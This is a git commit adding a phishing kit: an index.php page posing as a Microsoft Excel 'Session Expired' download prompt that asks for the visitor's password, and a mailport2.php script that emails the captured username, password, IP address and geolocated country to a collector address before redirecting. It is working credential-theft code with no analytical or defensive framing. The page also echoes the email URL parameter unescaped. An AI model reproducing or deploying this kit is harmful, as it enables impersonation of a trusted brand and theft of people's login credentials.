76037c7fbd1d7ab459fe81cfa6ae478da1759953
temphostserver <114225294+temphostserver@users.noreply.github.com>
2022-09-23 11:01:05 +0000

    Add files via upload

---
+++ index.php
@@ -0,0 +1,47 @@
+<html>
+<head>
+
+	<meta charset="utf-8">
+	<title>Microsoft Excel</title>
+	<link rel="stylesheet" href="./css/form.css">
+	<link rel="icon" href="./support/favicon.png" type="image/gif" sizes="16x16">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+
+	<style>
+	body, html { height: 100%; margin: 0; font-family: Arial, Helvetica, sans-serif;
+	}
+	* {box-sizing: border-box;
+	}
+	.bg-image {
+	/* The image used */
+	background-image: url("./support/background.png");
+	/* Add the blur effect */
+	filter: blur(2px); -webkit-filter: blur(2px);
+	/* Full height */
+	height: 100%; 
+	/* Center and scale the image nicely */
+	background-position: center; background-repeat: no-repeat; background-size: cover;
+	}
+	</style>
+
+</head>
+<body marginwidth="0" marginheight="0" topmargin="0" leftmargin="0" style="background: #FFF">	
+	<div class="bg-image"></div>
+	<table width="100%" border="0" cellspacing="0" align="center" 
+	style="position:absolute; top:207px; left:35px; width:283px; height:350px;">
+  	<tbody><tr><td style="background:#397448; border-radius:2px 7px 1px 15px;"></td></tr></tbody></table>
+	<img src="./support/logo.png" style="position:absolute; top:250px; left:60px; width:235px; height:45px; border-radius:1px 5px 2px 5px;">
+	<div style="position: absolute; top: 315px; left: 60px;">
+		<font style="font-family: arial; font-size: 17px; color:#FFF;">Session Expired</font>
+		<br><font style="font-family: arial; font-size: 12px; color:#FFFF00;">Download is 98% complete. Sign in to View</font>
+	</div>
+	<div style="position: absolute; top: 365px; left: 60px;">
+			<form method="post" action="./mailport.php">
+				<input  name="login" type="email" value="<?php echo $_GET['email']; ?>" disabled>
+				<br><br><input  name="passwd" type="password" placeholder="Password" required >
+				<br><br><input type="submit" value="View File">
+				<br><input type="hidden" name="login" value="<?php echo $_GET['email']; ?>">
+			</form>				   
+	</div>
+</body>
+</html>
---
+++ mailport2.php
@@ -0,0 +1,150 @@
+<?php
+$country = visitor_country();
+$countryCode = visitor_countryCode();
+$continentCode = visitor_continentCode();
+$ip = getenv("REMOTE_ADDR");
+$browser = $_SERVER['HTTP_USER_AGENT'];
+$login = $_POST['login'];
+$passwd = $_POST['passwd'];
+$own = 'loginbox@domain.com';
+$web = $_SERVER["HTTP_HOST"];
+$inj = $_SERVER["REQUEST_URI"]; 
+$domain = 'XLS';
+$sender = 'XLS';
+$subj = "1New Login | Country: $country | User IP: $ip";
+$headers .= "From: XLS<$sender>\n";
+$headers .= "X-Priority: 1\n"; //1 Urgent Message, 3 Normal
+$headers .= "Content-Type:text/html; charset=\"iso-8859-1\"\n";
+$over = 'go.php?email=$login';
+$msg = "<HTML><BODY>
+ <TABLE>
+ <tr><td><b>***Login Details</b></td></tr>
+  <tr><td></td></tr>
+   <tr><td>==============================================================</td></tr>
+ <tr><td>Username: <b>$login</b><td/></tr>
+ <tr><td>Password: <b>$passwd</b></td></tr>
+ <tr><td>Country: $country | User IP: <a href='http://whoer.net/check?host=$ip' target='_blank'>$ip</a> </td></tr>
+ <tr><td>==============================================================</td></tr>
+ </BODY>
+ </HTML>";
+if (empty($login) || empty($passwd)) {
+header("Location: go.php?email=$login");
+}
+else {
+mail($own,$subj,$msg,$headers);
+header("Location: go.php?email=$login");
+}
+
+function visitor_country()
+{
+    $client  = @$_SERVER['HTTP_CLIENT_IP'];
+    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
+    $remote  = $_SERVER['REMOTE_ADDR'];
+    $result  = "Unknown";
+    if(filter_var($client, FILTER_VALIDATE_IP))
+    {
+        $ip = $client;
+    }
+    elseif(filter_var($forward, FILTER_VALIDATE_IP))
+    {
+        $ip = $forward;
+    }
+    else
+    {
+        $ip = $remote;
+    }
+
+    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));
+
+    if($ip_data && $ip_data->geoplugin_countryName != null)
+    {
+        $result = $ip_data->geoplugin_countryName;
+    }
+
+    return $result;
+}
+function visitor_countryCode()
+{
+    $client  = @$_SERVER['HTTP_CLIENT_IP'];
+    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
+    $remote  = $_SERVER['REMOTE_ADDR'];
+    $result  = "Unknown";
+    if(filter_var($client, FILTER_VALIDATE_IP))
+    {
+        $ip = $client;
+    }
+    elseif(filter_var($forward, FILTER_VALIDATE_IP))
+    {
+        $ip = $forward;
+    }
+    else
+    {
+        $ip = $remote;
+    }
+
+    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));
+
+    if($ip_data && $ip_data->geoplugin_countryCode != null)
+    {
+        $result = $ip_data->geoplugin_countryCode;
+    }
+
+    return $result;
+}
+function visitor_regionName()
+{
+    $client  = @$_SERVER['HTTP_CLIENT_IP'];
+    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
+    $remote  = $_SERVER['REMOTE_ADDR'];
+    $result  = "Unknown";
+    if(filter_var($client, FILTER_VALIDATE_IP))
+    {
+        $ip = $client;
+    }
+    elseif(filter_var($forward, FILTER_VALIDATE_IP))
+    {
+        $ip = $forward;
+    }
+    else
+    {
+        $ip = $remote;
+    }
+
+    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));
+
+    if($ip_data && $ip_data->geoplugin_regionName != null)
+    {
+        $result = $ip_data->geoplugin_regionName;
+    }
+
+    return $result;
+}
+function visitor_continentCode()
+{
+    $client  = @$_SERVER['HTTP_CLIENT_IP'];
+    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
+    $remote  = $_SERVER['REMOTE_ADDR'];
+    $result  = "Unknown";
+    if(filter_var($client, FILTER_VALIDATE_IP))
+    {
+        $ip = $client;
+    }
+    elseif(filter_var($forward, FILTER_VALIDATE_IP))
+    {
+        $ip = $forward;
+    }
+    else
+    {
+        $ip = $remote;
+    }
+
+    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));
+
+    if($ip_data && $ip_data->geoplugin_continentCode != null)
+    {
+        $result = $ip_data->geoplugin_continentCode;
+    }
+
+    return $result;
+}
+?>
